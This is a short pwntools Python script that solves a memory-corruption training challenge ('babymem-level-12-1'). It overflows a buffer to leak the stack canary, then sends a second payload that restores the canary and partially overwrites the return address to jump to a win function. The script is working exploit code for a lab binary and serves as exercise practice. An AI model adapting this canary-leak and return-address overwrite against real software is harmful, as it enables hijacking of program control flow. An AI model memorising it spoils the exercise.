#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/babymem-level-12-1')
p = elf.process()

delta_len = 152
canary_dist = delta_len - 16 - len('REPEAT')
bytestream = b'REPEAT' + b'A' * canary_dist + b'X'

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)

p.recvuntil(b'X')
canary = p64(u64(p.recv(7).rjust(8, b'\x00')))

win_addr = p16(0x1a96)
canary_dist = delta_len - 16
padding = b'A' * canary_dist
bytestream = padding + canary + b'A' * 8 + win_addr

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
